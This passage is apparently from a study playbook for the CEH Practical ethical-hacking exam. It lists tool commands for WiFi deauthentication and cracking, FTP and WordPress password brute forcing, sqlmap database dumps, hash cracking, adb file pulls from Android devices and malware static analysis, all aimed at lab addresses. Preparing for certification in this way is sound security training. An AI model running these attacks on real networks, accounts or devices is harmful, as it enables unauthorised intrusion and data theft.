adb pull /sdcard/Download/secret.txt /home/user/Desktop/
adb pull /sdcard/log.txt /root/Desktop/

# 4. Or use PhoneSploit for automated extraction
```

---

## 📡 Wireless Network Hacking

### Aircrack-ng Suite

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture specific network
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthentication attack (to capture handshake)
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crack WEP
aircrack-ng capture-01.cap
```

### Exam Scenario - Crack WiFi Password

```bash
# Given: WirelessCapture.cap file

# Crack WPA/WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt WirelessCapture.cap

# If WEP
aircrack-ng WirelessCapture.cap

# Answer will be the WiFi password in specified format
```

---

## 🦠 Malware Analysis

### Static Analysis Tools

```bash
# Detect It Easy (DIE)
# Used to identify file type, entropy, packers

# Usage:
# 1. Open binary in DIE
# 2. Check entropy values
# 3. Identify sections with high entropy (potential malware)

# Strings analysis
strings malware.exe | grep -i password
strings -n 10 malware.exe                  # Strings > 10 chars

# File type identification
file malware.exe

# PE Analysis
readpe malware.exe
```

### Entropy Analysis

```bash
# High entropy (> 7.0) indicates:
# - Packed/encrypted content
# - Potential malware
# - Compressed data

# Tools:
# - Detect It Easy (DIE)
# - PEiD
# - binwalk

# Exam question format:
# "Find the hash of file with highest entropy"
# Use DIE to find entropy values
# Calculate hash of identified file
```

### Binary Analysis

```bash
# Ghidra (reverse engineering)
ghidraRun

# Radare2
r2 malware.exe
aaa                                        # Analyze all
pdf @main                                  # Print disassembly of main
iz                                         # List strings

# Find entry point
readelf -h binary | grep Entry
objdump -f binary | grep start
```

### Sandbox Analysis

```
Online sandboxes:
- VirusTotal (https://virustotal.com)
- Any.Run (https://any.run)
- Hybrid Analysis (https://hybrid-analysis.com)
- Joe Sandbox (https://www.joesandbox.com)
```

---

## ❓ Common Exam Questions

### Question Types and Approaches

#### 1. Network Discovery
```
Q: "What is the IP of the Windows X machine?"
A: nmap -O 192.168.1.0/24 | grep -A 5 Windows
```

#### 2. Service Identification
```
Q: "Which host has MySQL service running?"
A: nmap -p 3306 192.168.1.0/24 | grep -B 5 open
```

#### 3. FTP Credentials
```
Q: "Find FTP username and password"
A: hydra -L users.txt -P passwords.txt ftp://192.168.1.10
```

#### 4. WordPress Password
```
Q: "Crack the WordPress admin password"
A: wpscan --url http://192.168.1.10:8080/CEH/ -U admin -P wordlist.txt
```

#### 5. SQL Injection
```
Q: "Extract user X's password from the database"
A: sqlmap -u "URL?id=1" --cookie="..." -D db -T users -C password --dump --where="username='X'"
```

#### 6. Steganography
```
Q: "Extract hidden message from image"
A: steghide extract -sf image.jpg -p password
   OR: OpenStego (Windows)
```

#### 7. Cryptography
```
Q: "Decrypt the file/message using VeraCrypt"
A: Mount volume with VeraCrypt, enter password, access decrypted content
```

#### 8. Wireshark Analysis
```
Q: "Find the attacker IP in DDoS attack"
A: Statistics → Conversations → Sort by packets → Identify top source

Q: "Identify credentials in PCAP"
A: Follow TCP Stream on HTTP POST or FTP traffic
```

#### 9. Hash Cracking
```
Q: "Crack this MD5 hash"
A: john --format=raw-md5 --wordlist=rockyou.txt hash.txt
   hashcat -m 0 hash.txt rockyou.txt
```

#### 10. Android Exploitation
```
Q: "Retrieve file from Android device"
A: adb connect IP:5555
   adb pull /sdcard/path/file.txt
```

#### 11. RDP Access
```
Q: "Which hosts have RDP enabled?"
A: nmap -p 3389 192.168.1.0/24 | grep -B 5 open
```

#### 12. Wireless Cracking
```
Q: "Crack WiFi password from capture"
A: aircrack-ng -w rockyou.txt capture.cap
```

#### 13. File Entropy
```
Q: "Find hash of file with highest entropy"
A: Use DIE to check entropy → Calculate hash with md5sum/sha256sum
```

#### 14. Covert Channel
```
Q: "Decode covert TCP message"
A: Analyze Wireshark → Check IP ID field → Convert hex to ASCII
```

---

## 🎯 Exam Strategy & Tips

### Time Management

```
┌─────────────────────────────────────────────────────────────┐
│                 RECOMMENDED TIME ALLOCATION                  │
├─────────────────────────────────────────────────────────────┤
│  First 30 minutes:                                          │
│  • Network discovery and enumeration                        │
│  • Save scan results for later reference                    │
│                                                              │
│  Next 4 hours:                                              │
│  • Work through questions (~12 mins each)                   │
│  • Skip difficult questions, return later                   │
│                                                              │
│  Final 1.5 hours:                                           │
│  • Return to skipped questions                              │
│  • Verify answers                                           │
│  • Double-check format requirements                         │
└─────────────────────────────────────────────────────────────┘
```

#### During Exam
1. **Read questions carefully** - Note answer format hints (AA, aa, 00, **)
2. **Run initial scans first** - Save to files for reference
3. **Use Google wisely** - It's open book, search for tool syntax
4. **Don't get stuck** - Skip and return to difficult questions
5. **Check both VMs** - Some tools are only on Windows
6. **Take notes** - Document IP addresses, usernames, findings
7. **Verify answers** - Match format requirements exactly

#### Common Mistakes to Avoid
- ❌ Forgetting to check answer format
- ❌ Not saving scan results
- ❌ Spending too long on one question
- ❌ Missing wordlists location
- ❌ Using wrong tool syntax
- ❌ Not checking both Parrot and Windows VMs

### Answer Format Examples

```
Question hints → Your answer format

"The password is in format AAaa00"
→ Answer: ABcd12

"IP address of the machine"
→ Answer: 192.168.1.10

"MD5 hash of the file"
→ Answer: d41d8cd98f00b204e9800998ecf8427e

"Username in lowercase"
→ Answer: admin (not ADMIN or Admin)
```

---

## 📚 Practice Labs & Resources

### TryHackMe Rooms (Free)

| Room | Focus Area |
|------|------------|
| [Linux Fundamentals](https://tryhackme.com/room/linuxfundamentalspart1) | Linux basics |
| [Nmap](https://tryhackme.com/room/furthernmap) | Network scanning |
| [Metasploit](https://tryhackme.com/room/metasploitintro) | Exploitation |
| [Hydra](https://tryhackme.com/room/hydra) | Password cracking |
| [SQLMap](https://tryhackme.com/room/sqlmap) | SQL injection |
| [DVWA](https://tryhackme.com/room/dvwa) | Web attacks |
| [Wireshark](https://tryhackme.com/room/wireshark) | Packet analysis |
| [Crack The Hash](https://tryhackme.com/room/crackthehash) | Hash cracking |
| [Ice](https://tryhackme.com/room/ice) | Windows exploitation |
| [Lian Yu](https://tryhackme.com/room/lianyu) | CTF practice |
| [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt) | Full pentest |

### HackTheBox

- Easy to Medium machines
- Challenges: Steganography, Web, Crypto
- Focus on retired machines with walkthroughs

### Official Resources

- **EC-Council iLabs** - Official practice environment
- **CEH v13 Courseware** - Study material
- **CEH Practical Lab Manual** - Step-by-step labs

### YouTube Resources

- iLab walkthrough videos
- CEH Practical preparation guides
- Tool tutorials (Nmap, Metasploit, SQLMap)

### GitHub Resources

- [Guide-CEH-Practical-Master](https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master)
- [CEH-Practical-Notes-and-Tools](https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools)
- [CEH_CHEAT_SHEET](https://github.com/System-CTL/CEH_CHEAT_SHEET)

### Books

- "CEH All-in-One Exam Guide" by Matt Walker
- "CEH Certified Ethical Hacker Study Guide"
- "The Web Application Hacker's Handbook"

---

### During Exam - First 30 Minutes

```bash
# Execute these immediately:

# 1. Discover all subnets
nmap -sn 10.10.10.0/24 -oN hosts_10.txt
nmap -sn 172.16.0.0/24 -oN hosts_172.txt
nmap -sn 192.168.0.0/24 -oN hosts_192.txt

# 2. Identify live hosts
cat hosts_*.txt | grep "Nmap scan report"

# 3. Full scan on key targets
nmap -sC -sV -O -p- <target_ip> -oN full_scan.txt

# 4. Organize findings
# Create notes file with:
# - IP addresses
# - Open ports
# - Services
# - OS versions
```

---

## 📝 Quick Command Reference Card

```
╔══════════════════════════════════════════════════════════════════╗
║                    CEH PRACTICAL QUICK REFERENCE                  ║
╠══════════════════════════════════════════════════════════════════╣
║ SCANNING                                                          ║
║ nmap -sn 192.168.1.0/24              Host discovery               ║
║ nmap -sC -sV -O 192.168.1.10         Full scan                    ║
║ nmap -p 21,22,80,3389 192.168.1.0/24 Specific ports               ║
╠══════════════════════════════════════════════════════════════════╣
║ PASSWORD CRACKING                                                 ║
║ hydra -l admin -P list.txt ftp://IP  FTP brute force              ║
║ john --format=raw-md5 hash.txt       Crack MD5                    ║
║ hashcat -m 0 hash.txt wordlist.txt   Hashcat MD5                  ║
╠══════════════════════════════════════════════════════════════════╣
║ SQL INJECTION                                                     ║
║ sqlmap -u "URL?id=1" --dbs           Get databases                ║
║ sqlmap -u "URL" -D db -T tbl --dump  Dump table                   ║
╠══════════════════════════════════════════════════════════════════╣
║ WORDPRESS                                                         ║
║ wpscan --url URL --enumerate u       Enumerate users              ║
║ wpscan --url URL -U user -P list     Password attack              ║
╠══════════════════════════════════════════════════════════════════╣
║ STEGANOGRAPHY                                                     ║
║ steghide extract -sf image.jpg       Extract hidden data          ║
║ OpenStego (Windows GUI)              Alternative tool             ║
║ Snow.exe -C -p "pass" file.txt       Whitespace stego             ║
╠══════════════════════════════════════════════════════════════════╣
║ CRYPTOGRAPHY                                                      ║
║ md5sum file.txt                      Calculate MD5                ║
║ VeraCrypt - Mount encrypted volume   Disk encryption              ║
║ CryptTool - Decrypt messages         Windows GUI                  ║
╠══════════════════════════════════════════════════════════════════╣
║ WIRESHARK FILTERS                                                 ║
║ ip.addr == 192.168.1.10              Filter by IP                 ║
║ tcp.port == 80                       Filter by port               ║
║ http.request.method == "POST"        POST requests                ║
╠══════════════════════════════════════════════════════════════════╣
║ METASPLOIT                                                        ║
║ msfconsole                           Start Metasploit             ║
║ use auxiliary/scanner/smb/smb_login  SMB login scanner            ║
║ set RHOSTS IP; run                   Execute module               ║
╠══════════════════════════════════════════════════════════════════╣
║ ANDROID                                                           ║
║ adb connect IP:5555                  Connect to device            ║
║ adb pull /sdcard/file.txt ./         Download file                ║
╠══════════════════════════════════════════════════════════════════╣
║ WIRELESS                                                          ║
║ aircrack-ng -w wordlist capture.cap  Crack WiFi password          ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 📄 License

This playbook is provided for educational purposes only. Use these techniques only in authorized environments and with proper permission.

---
